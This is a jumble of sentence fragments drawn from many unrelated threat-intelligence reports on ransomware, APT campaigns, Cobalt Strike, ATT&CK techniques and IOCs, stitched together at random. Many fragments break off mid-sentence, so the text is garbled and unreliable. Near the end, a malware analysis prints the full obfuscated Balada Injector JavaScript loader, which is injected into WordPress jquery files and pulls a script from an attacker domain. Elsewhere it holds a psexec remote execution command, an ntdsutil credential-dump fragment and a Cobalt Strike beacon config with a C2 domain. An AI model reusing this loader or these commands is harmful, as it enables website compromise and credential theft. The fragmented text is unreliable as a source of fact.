Network Hygiene and Monitoring Actively scan and monitor internet-accessible applications for unauthorized access, modification, and anomalous activities. 
IronPython can use the .NET Framework and Python libraries, and other
The NTFS file system marks a file downloaded from the internet, and Windows handles the file in a safe way.
Figure 7.
[TA0009] Data from Local System [T1005] Data from Removable Media
getHashFlsa64.dll accesses the memory of its host LSASS process and stores stolen credentials in a Mimikatz log file named pc.log for later exfiltration. 
G0078 Gorgon Group
[WINDOWS-SYSMON] Rundll32 network connection detected 5008346 
With a few string pivots inside VT, or even a few Google searches, we can quickly discover the core functionality of the script has been widely reported on as it has been reused by many amateur cryptocurrency mining groups and opportunistic profit-seeking attackers. 
Example for the Gootkit variant (commented, full) Figure 10: The downloaded JavaScript The downloaded code chunk is responsible for installing the persistent elements.
==
Furthermore, since the data to be decrypted is in another file, the routine becomes even more difficult to investigate, as analysts would need the correct pair for decryption. 
Sending back the result of the command’s execution to the C2 server. 
Upon successful authentication, a user will be able to access the respective services. 
The usage of a proxy allows authors to control all of their mining implants and their target pools via a centralized console.
[T1059] such as PowerShell [T1059.001] Exploitation of software vulnerabilities in client applications to execute code
T1059.003Command and Scripting Interpreter:
Valid To: 07:43 AM 09/19/2016 Valid Usage: Code Signing Algorithm: sha256RSA Thumbprint: 91e256ac753efe79927db468a5fa60cb8a835ba5 Serial Number: 112195a147c06211d2c4b82b627e3d07bf09 
Try to Disable AntiSpyware, Real Time Protection and notification of Windows Defender. 
At the beginning of this year, another security researcher from Dragos pointed out some new scripts of the same threat actor uploaded to VirusTotal from two different submitters.
DLLHost.dat (psexec) The following command will execute on the remote machine: C:\Windows\dllhost.dat \\<target host> -accepteula -s
[C:\Users\uf0\source\repos\COOP\COOP\coop.cpp @ 54] 02 (Inline Function) --------`-------- coop!invoke_main+0x22
To start, the key is initialized with 0xD508.
Figure 8.
Patch and Vulnerability Management Install vendor-provided and verified patches on all systems for critical vulnerabilities, prioritizing timely patching of internet-connected servers and software processing internet data—such as web browsers, browser plugins, and document readers. 
Small Sieve: 
The actors stripped out unnecessary FOCUSFJORD capabilities, possibly to reduce the likelihood it would be detected by security controls.
More information on this service and others can be found here. 
If no compromise is detected, apply these updates as soon as possible. 
The threat actor gained access to the environment after a user opened an Excel document and enabled macros.
[7:Output,15,3,4] XOR with 4-byte random key BASE64 Print Build SessionId:
More information on this service and others can be found here. 
[12] Targeted Attack Lifecycle The Targeted Attack Lifecycle is a methodology to map adversary tactics, techniques, and procedures (TTPs) in a structed way.
Use a dedicated DNS server.
The intrusion lasted four days and contained many of the usual suspects, including the Cobalt Strike post-exploitation framework. 
Before 12 March 2020, NetWalker used the email contact process between its support operation and the victims to proceed with payment and send the decryption program.
As a result, it was initially known as the Tohnichi ransomware. 
The discovery of the new Gopuram infections allowed us to attribute the 3CX campaign to the Lazarus threat actor with medium to high confidence.
The Suricata engine did detect these connection attempts, however no alert was raised by the Packet Inspection Engine.
S0240 ROKRAT
These rules, which can be configured by all Microsoft Defender Antivirus customers and not just those using the EDR solution, offer significant protection against the tradecraft discussed in this report. Block executable files from running unless they meet a prevalence, age, or trusted list criterion Block Office applications from creating executable content Block process creations originating from PSExec and WMI commands Additionally, in 2022, Microsoft changed the default behavior of Office applications to block macros in files from the internet, further minimizing the attack surface for operators like this subgroup of Mint Sandstorm. 
2796542 0x0005 jitter 0x0001 0x0002 48 0x0007 publickey 0x0003 0x0100 30819f300d06092a864886f70d010101050003818d0030818902818100990b95ec8c7c882213d9afae50bc2f45ddf44795ab15a01de1db4356d5514af9f0ff9e4ddb58bb4499bf716be7d04128559449c06e494347bcb06f406a291dbd4df8a783aefd759c9c471ed03476c05dcbb3320413a79c07e45f3a6617354c548b0f076710f7c858070ada7d40627c98513f4a44492c4c30b68b30cea3802c33020301000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 0x0008 server,get-uri 0x0003 0x0100 'dofixifa.com,/ro' 0x0043 DNS_STRATEGY 0x0001 0x0002 0 0x0044 DNS_STRATEGY_ROTATE_SECONDS 0x0002 0x0004 -1 0x0045 DNS_STRATEGY_FAIL_X 0x0002 0x0004 -1 0x0046 DNS_STRATEGY_FAIL_SECONDS 0x0002 0x0004 -1 0x000e SpawnTo 0x0003 0x0010 (NULL ...) 
And this is the script used to automatically delete the ransomware from a list of computers in 2020: @echo off for /f
The goal is to send host info to the loader C2, then to gate the bot download.
Each virtual function contained in a counterfeit object is called a vfgadget and is responsible for performing a small task.
Use of the Unix shell may be common on administrator, developer, or power user systems.
We ran a PowerShell loader on the target host, which loaded a stageless SMB beacon in memory.
On systems where either of those is disabled, this module does nothing. 
These teams, referred to below as FlowingFrog, LookingFrog, and JollyFrog, have overlaps in TTPs, victimology and network infrastructure. 
Rule Set -----------------------------------------------------------------
Notably, Mandiant has continued to observe a steady increase in the number of publicly named victims on ransomware shaming sites within the past month.
It also provides guidance for defenders on protecting organizations from this threat, and how Microsoft security technologies detect it. Figure 1.
Use allowlist or baseline comparison to monitor Windows event logs and network traffic to detect when a user maps a privileged administrative share on a Windows system. 
Networking module This ModPipe module is responsible for sending requests to C&C and parsing payload received in the C&C responses.
Generic V2 Execution The below courses of action mitigate the following techniques: Service Execution
SPSniffer: serial port sniffer allowing capture of not-encrypted traffic 
Figure 6 Section 2 of GuLoader's first stage PowerShell. 
We maximized the usage of Windows Security EventCode 4663 for this analytic story.
The TLV (type-length-value) format to exchange data with C2 servers TLV type constants that are found in the Trojan The Trojan’s Cryptography Library to encrypt/decrypt exchanged data On startup, the Post-Validator verifies that it is not launched inside a sandbox environment.
Phishing T1566.001 Hive actors gain access to victim networks by distributing phishing emails with malicious attachments. 
Following the first discovery stage, the threat actor installed RSAT (Remote Server Administration Tools) on the beachhead host, which contains the ActiveDirectory PowerShell Module. 
Therefore, MITM is possible in that case also. 
This file is read and unarchived to the original file path of the I2P dropper script.
In this same attack against the energy station in Ukraine, other wiper samples for Linux and Solaris were observed by WeliveSecurity.
DiscoveryThe attackers have used various RATs with modules that show running processes. 
Possibly it is a bug in the implementation, and the if statement was intended to be a while loop instead.
readme_contact_alex.dali@iran.ir.htm contain encrypted session keys we need in order to be able to decrypt your files. 
While analyzing the complex malware loader we made a surprising discovery.
[4] “Internet Security Report – Q4 2020,” WatchGuard, accessed May 4, 2021, published March 30, 2021, https://www.watchguard.com/uk/wgrd-resource-center/security-report-q4-2020, 3. 
If none of the software mentioned above is installed, it will extract and send an embedded binary downloader to the compromised device that executes and downloads the primary payload. 
186837 [+] FILE COMPRESSED SIZE: 183734 ... 
calc_hash(char
Data Coowon\Coowon\User Data liebao\User Data QIP Surf\User
This site reiterates the problem and that the actor's Decrypt App private key is the only way to get their data back.
Miscellaneous commands 0x8018A0 
"C: & cd \ & echo ntdsutil \"ac
S1119 LIGHTWIRE
[MITRE ATT&CK] Third-party Software (T1072) 
Without dynamic analysis, they won’t be able to detect exactly what that payload will be. 
In addition to encrypting files, Royal actors also engage in double extortion tactics in which they threaten to publicly release the encrypted data if the victim does not pay the ransom. 
The primary executable is a dropper containing a legitimate version of the application and I2P tooling.
Subsequent communication between the client and server occurs via protocol 1, except for when, at the beginning of the session, the client sends two packets with the FakeTLS header, which starts with the sequence 17 03 01.
Next, the script constructs an email with a hardcoded subject and body and attaches the HTML file from the “fb” folder.
In GHOST attacks performed by the newer versions of Prilex, it requests new EMV cryptograms after capturing the transaction.
Using its anomaly-based detection, Darktrace DETECT:trade_mark: was able to identify the activity chain surrounding the use of this application, potentially uncovering a novel piece of threat actor tradecraft in the process.
[T1030].
As seen in the screenshot below, the BP stopped on the call to VirtualAlloc, which is in the Kernel32.dll, and in the stack view (right low corner) we can see the arguments passed to the function.
SystemUpTime < 480 WMI Event consumer (CommandLineTemplate) C:\Program Files (x86)\Common Files\Adobe\<FILENAME>.exe Filter to consumer binding CommandLineEventConsumer.
Post-exploitation tools We found a custom Chrome password and cookie grabber that appeared unfamiliar, and it was compiled and uploaded in September 2022.
c:\windows\system32\inetsrv\&net use&cd "cmd" /c cd /d
Goodware String - occured 41 times */ $s15 = "Root Entry" fullword wide /*
Interestingly, all the samples of this “new” version had a domain name as its C&C. In the previous version of SysUpdate, the group used hardcoded IP addresses as C&C. It is possible that this change is a consequence of the new DNS TXT records’ communication feature as it requires a domain name. 
If obtained, the Mint Sandstorm subgroup can use the Active Directory database to access credentials for users’ accounts.
Ransom Cartel TOR site.
echo
Disable or Modify System Firewall Discovery T1012:
There are a couple of factors that we can utilize to fingerprint any suspicious traffic and subsequent infrastructure.
Periscope, and Temp.
Disable or Modify Tools [T1562.001] Impair Defenses: Disable or Modify System Firewall [T1562.004] Hide Artifacts: Hidden Files and Directories
GoBruteforcer GolangBased Botnet Actively Harvests Web Servers
The following technical indicators are associated with the reported intelligence.
Although potentially viewed as unsophisticated or basic these techniques have been successful, so it is vital that organisations factor in controls and mitigations to address them. 
Microsoft Threat Intelligence has detected destructive operations enabled by MERCURY, a nation-state actor linked to the Iranian government, that attacked both on-premises and cloud environments.
Data Exfiltration—1 GB of Data Send a large amount (1 GB) of mock sensitive information to an external system over various protocols, including ICMP, DNS, FTP, and/or HTTP/S. Exfiltration Over Alternative
It contains, among others, the following: Encryption keys Credentials for Google Drive API access Window titles to keylog List of file extensions to exfiltrate Dolphin evolution Since the initial discovery of Dolphin in April 2021, we have observed multiple versions of the backdoor, in which the threat actors improved the backdoor’s capabilities and made attempts to evade detection.
What Is IronPython? 
If Windows Defender or Bitdefender Antivirus is installed on the victim’s computer, the malware executes itself with the following commands: Windows Defender: cmd /c
Shortly after, GoSecure researchers received yet another BazarLoader sample on 2020-10-08 named Document2-85.exe, which exhibited similar behavior. 
S0166 RemoteCMD
To enhance operational security, we can employ a clever alternative approach that eliminates the need to download files directly onto the victim’s computer: PE reflective injection. 
S1060 Mafalda
The FortiGuard Web Filtering Service detects the C2 URLs cited in this report as Malicious and blocks them. 
The contents detail the company’s approach to radio drama production scheduled for broadcast in May 2023. 
Error: Could not decrypt AUTH Token') def get_auth_token(): """Get AUTH Token from third party service""" try: 
The account is created with a long complex password as well, and by default (if using the express settings) prefixed with Sync_[ServerName].
NCC Group and Fox-IT decompiled the tool for analysis.
The user is also asked to permit push notifications in the browser, which allows the attacker to push malicious ads, as we will demonstrate later in this analysis. 
During the process of execution, wave 2 ransomware attempts to decrypt and execute embedded scripts, malware settings or API function names.
Gets command from C2 and executes it dl Sends a get request with the parameter “a=update” to the C2 and does the same as the dlAR task. 
The SMOKEDHAM backdoor source code is embedded as an encrypted string.
We can continue running the program until the next hit on the VirtualAlloc call. 
Attackers can now initiate the AD user objects Replication request to the Domain Controller using Directory Replication Services Remote Protocol (DRSUAPI).
Possible Traversal - File created in Public directory 5008349 
This information was logged under Event ID 6.
# ========================================== #\n# Vulnerability 1 - Non-unique x-coordinate  #\n# ========================================== #\n\nH = ZcashPedersenHash(message)\nprint(f"Zcash's Hash of {message} = {H}")\n# Zcash's Hash of  ['010101', '000111']  =  (83 : 83 : 1)\n\ncolliding_message = ["011100", "001110"]\nH2 = ZcashPedersenHash(colliding_message)\n\nassert H[0] == H2[0]\nassert message !
0xE04A219 : kernel32_HeapCreate 0xA1ADA36 : kernel32_lstrcpyA 0x5097BB4 : kernel32_RegOpenKeyExA 0x750EFAB : kernel32_GetLastError 0x4CB039A : kernel32_RegQueryValueExA 0xAAF4498 :
Optionally, ProcList can also collect information about loaded modules for each of the running processes.
C:\Windows\system32\cmd.exe /C
This IP address is associated with the VPN service, HMA VPN.
[D3-SPA] Process Lineage Analysis [D3-PLA] Valid Accounts
This routine to get the PID slightly differs in the IronPython scripts we found.
107.148.45[.]48PEG TECH INC2022-12-2212-16.pinyin-sougou[.]com; C&C server. 
This subdomain tells Cloudflare to associate that DNS record with a specific distribution. 
The actors added an exclusion rule to Windows Defender.
This value will also be used as indicator if full encryption or partial encryption will be performed on the file For example, with a file with a file size equal to 5,245,000: N = 50/10 * (5245000 / 100) & 0xFFFFFFF0 = 0x40060 (262240) 
The attack team also used various techniques to create backdoors on the affected system and perform lateral movements to other servers in the system. 
Users Should Take the Following Steps After the Ransomware Attack Detach infected devices on the same network. 
The files signed with it were predominantly used in attacks on organizations in Hong Kong.
System Network Configuration Discovery Lists internal IP addresses to target in C:\Windows\pc_list.txt – typically found on the Domain Controller. T1082.
The threat actor utilized automated vulnerability discovery and reconnaissance techniques to scan a given target list, refine the selection and identify potential exploitable systems before commencing the attack.
We were unable to cluster those packages until the middle of 2019 when we found a host that served these installers among FinSpy Mobile implants for Android.
Malware Deep Dive This section contains a deeper look at the Dave Loader, Domino Backdoor, Domino Loader, and Project Nemesis Infostealer malware. 
While Intezer automatically identifies that the file is packed and extracts the payload for us, we will show how you can manually extract the payload here. 
New variation: cdn.clickandanalytics[.]comAfter May 17, 2023 we started noticing similar JavaScript injection into legitimate website files that loaded the Balada script from: hxxps://cdn.clickandanalytics[.]com/trackIt’s a very fresh domain.
The ransomware builder interface allows affiliates to configure various settings for building the ransomware executables.
This domain name was registered on March 27th, 2023, after seroxen[.]com was decommissioned.
It is even signed with an invalid portal.office.com certificate (Figure 6). 
During Phase II, the team uploaded and executed well-known malicious files to the DC to generate host-based alerts. 
%Profile%\cr.dat Spawned command: cmd.exe %Profile%\cr.dat 5pKwgIV5otiKb6JrNddaVJOaLjMkj4zED238vIU= After initial infection, we observed several keyboard hands-on activities by the operator.
CharmPower can read files, gather information on an infected host, and send details back to the attackers. 
TYPE INDICATOR DESCRIPTION SHA256 a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92 WhisperKill (stage1.exe) SHA256 dcbbae5a1c61dbbbb7dcd6dc5dd1eb1169f5329958d38b58c3fd9384081c9b78 WhisperKill (stage2.exe) SHA256 0385eeab00e946a302b24a91dea4187c1210597b8e17cd9e2230450f5ece21da HermeticWiper SHA256 1bc44eef75779e3ca1eefb8ff5a64807dbc942b1e4a2672d77b9f6928d292591 HermeticWiper SHA256 13037b749aa4b1eda538fda26d6ac41c8f7b1d02d83f47b0d187dd645154e033 IsaacWiper SHA256 9b4dfaca873961174ba935fddaf696145afe7bbf5734509f95feb54f3584fd9a AcidRain SHA256 47f521bd6be19f823bfd3a72d851d6f3440a6c4cc3d940190bdc9b6dd53a83d6 AcidRain SHA256 Fc0e6f2effbfa287217b8930ab55b7a77bb86dbd923c0e8150551627138c9caa CaddyWiper SHA256 7062403bccacc7c0b84d27987b204777f6078319c3f4caa361581825c1a94e87 Industroyer2 SHA256 3b2e708eaa4744c76a633391cf2c983f4a098b46436525619e5ea44e105355fe DoubleZero SHA256 30b3cbe8817ed75d8221059e4be35d5624bd6b5dc921d4991a7adc4c3eb5de4a DoubleZero Mapped to MITRE ATT&CK The findings of this report are mapped to the following MITRE ATT&CK Matrix techniques: TA0001: Initial Access T1190: Exploit Public-Facing Application TA0002
TA0004 Privilege Escalation T1068 Exploitation for Privilege Escalation The ProxyShell elevation of privilege on the Exchange PowerShell Backend (CVE-2021-34523), Windows Background Intelligent Transfer Service (BITS) improperly handling symbolic links (CVE-2020-0787), and abusing the CMSTPLUA COM interface have all been seen as methods of privilege escalation. 
Monitor the file system for created, moved, and renamed DLLs. 
Fig.17 CAR dashboard for 3CX Qualys Multi-Vector EDR customers are protected against this threat as both the installer and the beacon are detected and will be remediated.
Right after the beacon was executed, the threat actors began enumerating the network using native Windows binaries and the PowerView module, Invoke-ShareFinder.
title: Hancitor Infection Chain Analysis: An Examination of its Unpacking Routine and Execution Techniques url: https://threatresearch.ext.hp.com/hancitors-return-analyzing-its-latest-infection-chain/ In this article, we describe how Hancitor compromises systems based on its infection chain observed in January and February 2021.
All these cases involve Cobalt Strike as the post-exploitation method. 
The team sent spearphishing emails with links to a red-team-controlled domain to gain access to the organization’s systems. 
The malware checks to see if the value of that field is SV_TYPE_SERVER_NT, SV_TYPE_DOMAIN_CTRL, or a SV_TYPE_DOMAIN_BAKCTRL.
Project Nemesis is a commodity malware written in .NET which was first advertised for sale on the dark web in December 2021, though it does not seem to be widely known and it is not frequently observed in the wild. 
Driver Signature Name:
WMI classes can contain methods (code) and properties (data).
In order to persist the start of the loading chain, the installer sets a Run registry value: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\<random_run_name>\”%appdata%\Python27({32|64})\pythonw.exe” “<loader_step_1>” “<loader_encrypted_step_2>” The <random_run_name> is randomly selected from existing filenames matching %WINDIR%\inf\*.inf, discarding the .inf extension. 
LockBit 2.0 Tactics, Techniques and Procedures Technically speaking, we have observed LockBit 2.0 affiliates leveraging the following tactics, techniques and procedures: TA0001 Initial Access T1078 Valid Accounts Credentials that have either been reused across multiple platforms or have previously been exposed.
Table 2 - Installs RedLine Scans for Chrome GameLauncher for Steam Filezilla Guarda Gecko Jaxx Armory Metamask Atomic Monero Coinom OpenVPN DesktopMessenger for Telegram NordVPN Discord ProtonVPN Electrum Tronlink Ethereum Yoroi Conclusion The threat actors behind this campaign used fileless delivery as a way to bypass security measures, and this technique is used by actors for a variety of objectives and motivations.
Use scheduled tasks and batch files for automation.
As we do not see SMB beacons used often in our intrusion cases, we took an example case from our lab to demonstrate the effectiveness of this method. 
With U.S. Tax Day approaching, Microsoft has observed phishing attacks targeting accounting and tax return preparation firms to deliver the Remcos remote access trojan (RAT) and compromise target networks beginning in February of this year. 
We also identified two new Trigona ransom notes in January 2023 and two in February 2023. 
We reported these ads to Google and they were promptly removed. 
TacticIDNameDescription Resource DevelopmentT1587.001Develop Capabilities: MalwareTA410 develops LookBack and FlowCloud. 
Malware persistence is achieved via scheduled tasks (click the image for a larger version) 
In the orchestrator, the commands are identified by a numerical identifier that is computed from the command name, as shown in Figure 19. Figure 19.
S0019 Regin
System Network Connections Discovery T1049 The team listed existing network connections on SCCM Server 1 to reveal an active SMB connection with server 2. Permission Groups Discovery: Domain Groups T1069.002 The team leveraged ldapsearch and dsquery to query and scrape active directory information. 
Had the analyst not conducted their due diligence or had this archaic signature been suppressed, it is highly likely that this compromise would not have been detected until after the encryption process had begun. 
Multiple instances of Emotet spawning itself was observed over a period of three days.
Marshal]::SecureStringToBSTR $SecureString2 = {5b 53 79 73 74 65 6d 2e 52 75 6e 74 69 6d 65 2e 49 6e 74 65 72 6f 70 53 65 72 76 69 63 65 73 2e 4d 61 72 73 68 61 6c 5d 3a 3a 50 74 72 54 6f 53 74 72 69 6e 67 41 75 74 6f} //[System.
Due to the many ways Cobalt Strike is deployed, detection can be hard.
The malware itself is written in Russian and coded in the Rust programming language.
The list of commands and IDs are shown below: 0x00: Register (used by the client) 
["10101101", "011100101"]\n\n# Ensures encoding colliding_message results in the integers\n# used explicitly above \nassert EncodeMessage(colliding_message, IdentityEncode)
We did not see any further activity but we believe if given enough time, this would have ended with domain wide ransomware.
Debug string in PUBLOAD In summary, we think that the new TONESHELL and PUBLOAD archives have been evolving and now have something in common.
When sophisticated cyber threat actors conduct operations against soft targets, it can negatively impact critical infrastructure, federal, and state, local, tribal, territorial government networks, possibly resulting in loss of critical data or personally identifiable information. 
.dmg .dmp .doc .docx .dtd .dwg 
S0069 BLACKCOFFEE
Jquery injectionsIn some cases, the following obfuscated JavaScript code is injected on top of wp-includes/js/jquery/jquery.min.js and wp-includes/js/jquery/jquery-migrate.min.jsvar m=b;(function(c,e){var l=b,f=c();while(!![]){try{var g=parseInt(l(0x135))/0x1+parseInt(l(0x12b))/0x2+-parseInt(l(0x12d))/0x3+parseInt(l(0x13d))/0x4+-parseInt(l(0x12e))/0x5*(parseInt(l(0x12a))/0x6)+parseInt(l(0x12f))/0x7*(-parseInt(l(0x13e))/0x8)+parseInt(l(0x13c))/0x9;if(g===e)break;else f['push'](f['shift']());}catch(h){f['push'](f['shift']());}}}(a,0x7f054));function b(c,d){var e=a();return b=function(f,g){f=f-0x128;var h=e[f];return h;},b(c,d);}var j=document,k=j[m(0x130)](m(0x12c));k[m(0x138)]='h'+'tt'+m(0x13f)+'/'+'/s'+'ta'+m(0x128)+'t'+m(0x134)+'ri'+'p'+'ts'+m(0x132)+'tf'+'or'+m(0x13a)+m(0x136)+'lo'+'b'+'al';function a(){var n=['3558289hXnVzT','createElement','getElementsByTagName','pla','insertBefore','ics.sc','420078GNrZss','m/g','currentScript','src','head','m.co','parentNode','8887806xXCyNX','388724nuSCLw','8ZOcngi','ps:','tis','appendChild','3101916zsXWgk','1138664hDNQfV','script','1585608NAjuAN','5gMyIif'];a=function(){return n;};return a();}document[m(0x137)]?document[m(0x137)][m(0x13b)][m(0x133)](k,document[m(0x137)]):j[m(0x131)](m(0x139))[0x0][m(0x129)](k);This script also belongs to Balada Injector and loads hxxps://statistics.scriptsplatform[.]com/global.
Information such as operating system architecture, framework version, operating system version, etc.
Interestingly, the threat actor registered a domain name similar to the company name and used it as a C&C.
The data, however, is not copied identically from the section to the new memory region because the bytes containing 0x21 are omitted.
Figure 42.
S0608 Conficker
Fetches configuration details from a hardcoded URL and saves it at different places (for example, c:\logs.uce, %localappdata%\logs.uce). 
Talos compiled a table showing the malicious Windows shortcut files and their relative paths with the command line arguments.
When individual users need the account, they submit their requests through an automated process that enables access to a system but only for a set timeframe to support task completion. 
Given the following features, the Unit 42 team believes with moderate confidence that the surface web leak page was a development environment to test out features before a possible move to the dark web: Several posts appear to be duplicates from the BlackCat leak site (as shown in Figure 4) 
During this intrusion, the threat actors gained access using an ISO and LNK file, used several lateral movement techniques, dumped credentials three different ways, kerberoasted a domain admin account and dropped/executed a bespoke tool for discovering privilege escalation paths. 
In such cases, syscalls are usually made via Wow64 emulation layer.
Authors: Denis Goydenko and Alexey Vishnyakov, Positive Technologies MITRE TTPs Tactic ID Name Initial Access T1190 Exploit Public-Facing Application T1199 Trusted Relationship Execution T1059 Command and Scripting Interpreter:
import java.io.
| +----------------------+-----------------------+ A deep dive into all available fields can be found on this post from @ZephrFish.
ConnectionLimit =65535; If ($req.
This is done by creating a schedule task invoking taskkill.exe. 
This blog contains analysis on how OneNote documents are used malicious and two specific campaigns that made use of OneNote documents to download and execute the Qakbot malware. 
Even if the backdoor executable is removed, the firmware will simply drop it again the next time the system boots up.
It tries to extract the cookies and login data for each browser name, and after extracting this information checks if the flag sendD (send data) is set to true.
Interestingly, the folder with the backdoor contained two other tools: Autoruns by Sysinternals, and HRSWord, which is a part of the Chinese Huorong Network Technology protection suite, and is often used by various actors to disable endpoint protection tools. 
You can also take preventative steps by requesting any of our cyber risk management services. Indicators of compromise and Ransom Cartel-associated tactics, techniques and procedures (TTPs) can be found in the Ransom Cartel ATOM. 
Figure 10.
ISO Cloudflare_security_setup.iso The RAT installation is disguised to look similar to a Google Chrome installation. 
New IoCs analyzed in surrounding text.
0x7502A0 Terminate all livestreams. 
0x6D6E70D40caclsModify the access controls of a given object using SetEntriesInAclA, SetNamedSecurityInfoA and BuildExplicitAccessWithName. 
RedLine Stealer is written in .NET and has been observed stealing multiple types of data (full list shown in Table 2 below), including: : Cookies Credentials (chat clients, VPNs, crypto wallets, browser ) 
The downloading of the actual malware is done via a variety of possible commands (for example, wget, curl, tftp and ftpget).
URL: https://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.34.8570.\n
The malware only targets fixed drives on the system.
This demonstrates how Nefilim will keep the pressure on its victims to pay ransoms. 
BazarLoader will also check if it is connected to the internet by making a request to microsoft[.]com, as seen in Figure 17. Figure 17: BazarLoader Internet Connectivity Check Once completed, it will make a POST request to the second domain in its configuration, as seen in Figure 18. Figure 18: BazarLoader C2 Checkin Once completed, it will make a HTTP GET request in order to obtain the next stage, as seen in Figure 19. Figure 19:
S0206 Wiarp
+ 35*<M2'> =  (-29 -35*63 ) = 129 mod 139\nH2 = GenericPedersenHash(GENERATORS, [17, 31])\nassert H == H2\n\nH3 = ZcashPedersenHash(["000000", "001100"])\nassert H == H3\n
Sysmon showing Emotet starting the Cobalt Strike executable. 
In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory.
The alert message that was visible: The activity can be observed in the PowerShell WinEvent logs: 
S1021 DnsSystem
Group 5171 differentiates itself from other threat actors with their use of the travelling laptop attack.
Only a handful of times the adversary copies the data first before compressing (archive collected data) and exfiltrating it.
S0103 route
CISA has observed Chinese MSS-affiliated actors using the Execution [TA0002] technique identified in table 7. Table 7: Execution technique observed by CISA MITRE ID Name Observation T1072 Software Deployment Tools CISA observed activity from a Federal Government IP address beaconing out to the threat actors’ C2 server, which is usually an indication of compromise. 
The event includes multiple seminars on political theory, military history, and a talk on “Intelligence activities and cyber security of the National Intelligence Service.”
Click here for Anomali recommendation Beware Of Emails Purporting To Be From The IRS (September 17, 2018) 
Conclusion Based on our analysis, the TZW ransomware recently documented by AhnLab is yet another example of the threat actors behind GlobeImposter pivoting their TTPs alongside a rebrand, including a new but related Onion address.
The IP is pushed into the list generated by the malware at runtime. 
address47.75.0[.]147 2019Password sprayIPv4 address5.254.112[.]226 2019Initial accessIPv4 address5.254.64[.]234 2019Initial accessIPv4 address59.47.4[.]27 2019Initial accessIPv4 address39.109.5[.]135Q3 2017VPN server loginIPv4 address43.250.200[.]106Q3 2017VPN server loginIPv4 address119.39.248[.]101Q3 2017VPN server loginIPv4 address220.202.152[.]47Q3 2017VPN server loginIPv4 address119.39.248[.]20Q3 2017VPN server loginIPv4 address185.170.210[.]84Q3 2017VPN server loginIPv4 address43.250.201[.]71Q3 2017VPN server loginIPv4 address23.236.77[.]94Q3 2017ADFS loginPathC:\Code\NtdsAudit\src\NtdsAudit\obj\Release\–NTDSAudit artifactsPathC:\Users\Public\Appdata\Local\–Staging and toolsPathC:\Users\Public\Appdata\Local\Microsoft\Windows\INetCache–Staging and toolsPathC:\Users\Public\Libraries\–Staging and toolsPathC:\Users\Public\Videos\–Staging and toolsPathC:\Windows\Temp\–Staging and toolsPathC:\Windows\Temp\tmp–Staging and toolsURI in CS beacon/externalscripts/jquery/jquery-3.3.1.min.js Q3 2019 – Q1 2020–URI in CS beacon/externalscripts/jquery/jquery-3.3.2.min.jsQ2 2019 – Q3 2019–URI in CS beacon/jquery-3.3.2.slim.min.jsQ1 2020–User-agentMozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko–Web VPN loginUser-agentMozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko–Cobalt Strike beacon Observed discovery commands TechniqueCommandAccount discoverynet userAccount discoverynet user AdministratorAccount discoverynet user /domainAccount discoverydir \\<hostname>\c$\usersAccount discoverydsquery user -limit 0
Also thanks to @svch0st, @pigerlin, and @0xtornado for reviewing this report. 
Unlike traditional methods that rely on suspicious indicators such as macros, this technique does not require their presence in the document until the malicious template is retrieved. 
We’ve found a variety of packers used for these executables, but their purpose is always to have a remote access trojan running on the victimized computer, usually by decrypting the payload and injecting it into legitimate processes.
We extracted this PowerShell script from the .Net loader mentioned in the previous section, and the script for its ransomware is similar to the one for its stealer. 
The threat actor sent users a private message inviting them to download a related application that would supposedly grant the user access to new features and/or additional benefits.
DS-LDS.Tools~~~~0.0.1.0” ➝ C:\Windows\system32\cmd.exe /C
> /dev/null 2>&1;rm
G0007 APT28
Learn more about the Cyber Threat Alliance. Indicators of Compromise Samples ZIP file: 4edd01345f58b9cc04a88ca15d6b82895f44f5b9cb51ad63b809de09029670ac ISO: 8a5a024272361bb1ae12860c033bb52685d7b0ea3bce5fac46439f3f3ad36a84 Loader: 1b574a66c84924886daec4841e1b107258e019aaf6f336329ae8fae7cbd52a34 Infrastructure efvsx[.]gq 188.114.96[.]13 Additional Resources Appendix Field Description Offset Size LokiBot version 0x0 0x2 Payload type 0x2 0x2 BinaryID unicode 0x4 0x2 BinaryID length 0x6 0x4 
This technique was observed by Cisco Talos researchers in 2020 to deploy Cobalt Strike.
In latest variant of GuLoader it introduces new ways to raise exceptions that hamper complete analysis process and its execution under controlled environment. 
It creates directory listings and exfiltrates files.
The figure below depicts the delivery method employed by the LockBit ransomware group. 
While no ransomware was observed here, Mandiant believes that affiliate groups that have conducted DARKSIDE intrusions may use multiple ransomware affiliate programs and can switch between them at will. 
We detected webshells, mostly obfuscated, being dropped to Exchange servers.
The following graph sum-up the COOP attack strategy discussed so far. 
Consider disabling WDigest authentication. 
If they provide a password, unzip the file and then scan the contents with an endpoint security tool before opening them. 
As a threat responder, you may want to create a dashboard for NetWalker-related threat events to understand current exposure.
With Dependency Emulation, we can increase our detonation rates to collect more execution logs necessary for accurate detection.
S0074 Sakula
This executable binary insecurely downloads and executes additional payloads from the Internet. 
ThreatFox LokiBot monitoring.
SentinelOne Singularity protects against malicious behaviors and malware associated with GlobeImposter and TZW. 
CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.
Our analysis has shown only the 3CX ffmpeg.dll contains the malicious code.
The image in Figure 9 show the batch file being created in the user’s temp location. 
Functions are always the same – dedicated to reading the file from the disk: CreateFileW, GetTempPathW, lstrcatW, ReadFile, VirtualAlloc, GetTempPathW.The function GetTempPathW is used to retrieve the path to the %TEMP% directory, where all the components from the archive were automatically extracted at runtime of the NSIS fileThe name of the next file is concatenated to the the %TEMP% pathMemory is allocated for the file content, and the file is read into this bufferA custom decryption algorithm is being applied on the buffer (the algorithm is different for different samples).
